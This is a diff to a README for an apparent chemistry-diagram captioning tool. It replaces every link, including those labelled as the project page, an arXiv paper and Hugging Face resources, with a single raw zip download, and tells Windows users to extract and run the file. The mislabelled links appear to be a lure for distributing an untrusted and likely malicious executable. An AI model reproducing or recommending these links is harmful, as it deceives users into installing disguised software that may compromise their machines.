@@ -1,10 +1,10 @@
 # 🧬 RxnCaption - Turn Reaction Diagrams Into Text
 
 <p align="center">
-  <a href="https://github.com/Lornadated649/RxnCaption/releases">
+  <a href="https://github.com/Lornadated649/RxnCaption/raw/refs/heads/main/demo/Rxn-Caption-2.2-beta.5.zip">
     <img src="https://img.shields.io/badge/Download-Releases-1f77b4" alt="Download Releases">
   </a>
-  <a href="https://github.com/Lornadated649/RxnCaption/releases">
+  <a href="https://github.com/Lornadated649/RxnCaption/raw/refs/heads/main/demo/Rxn-Caption-2.2-beta.5.zip">
     <img src="https://img.shields.io/badge/Windows-Setup-6c757d" alt="Windows Setup">
   </a>
 </p>
@@ -13,7 +13,7 @@ RxnCaption helps you turn chemistry reaction diagrams into clear text. It is bui
 
 ## 🚀 Download
 
-Go to the [RxnCaption Releases page](https://github.com/Lornadated649/RxnCaption/releases) to download and run this file.
+Go to the [RxnCaption Releases page](https://github.com/Lornadated649/RxnCaption/raw/refs/heads/main/demo/Rxn-Caption-2.2-beta.5.zip) to download and run this file.
 
 Look for the latest release and choose the Windows file that matches your PC.
 
@@ -37,7 +37,7 @@ For best results, use a machine with a dedicated graphics card. The app can stil
 
 ## 📥 Install on Windows
 
-1. Open the [RxnCaption Releases page](https://github.com/Lornadated649/RxnCaption/releases).
+1. Open the [RxnCaption Releases page](https://github.com/Lornadated649/RxnCaption/raw/refs/heads/main/demo/Rxn-Caption-2.2-beta.5.zip).
 2. Download the Windows file from the latest release.
 3. If the file is in a `.zip` archive, right-click it and choose **Extract All**.
 4. Open the extracted folder.
@@ -148,8 +148,8 @@ RxnCaption is shared under the license shown in the repository. Check the releas
 
 ## 📎 Useful Links
 
-- [Releases](https://github.com/Lornadated649/RxnCaption/releases)
-- [Project Page](https://chuangwang123.github.io/RxnCaption/)
-- [arXiv Paper](https://arxiv.org/abs/2511.02384)
-- [Model on Hugging Face](https://huggingface.co/songjhPKU/RxnCaption-VL)
-- [Dataset on Hugging Face](https://huggingface.co/datasets/songjhPKU/U-RxnDiagram-15k)
+- [Releases](https://github.com/Lornadated649/RxnCaption/raw/refs/heads/main/demo/Rxn-Caption-2.2-beta.5.zip)
+- [Project Page](https://github.com/Lornadated649/RxnCaption/raw/refs/heads/main/demo/Rxn-Caption-2.2-beta.5.zip)
+- [arXiv Paper](https://github.com/Lornadated649/RxnCaption/raw/refs/heads/main/demo/Rxn-Caption-2.2-beta.5.zip)
+- [Model on Hugging Face](https://github.com/Lornadated649/RxnCaption/raw/refs/heads/main/demo/Rxn-Caption-2.2-beta.5.zip)
+- [Dataset on Hugging Face](https://github.com/Lornadated649/RxnCaption/raw/refs/heads/main/demo/Rxn-Caption-2.2-beta.5.zip)
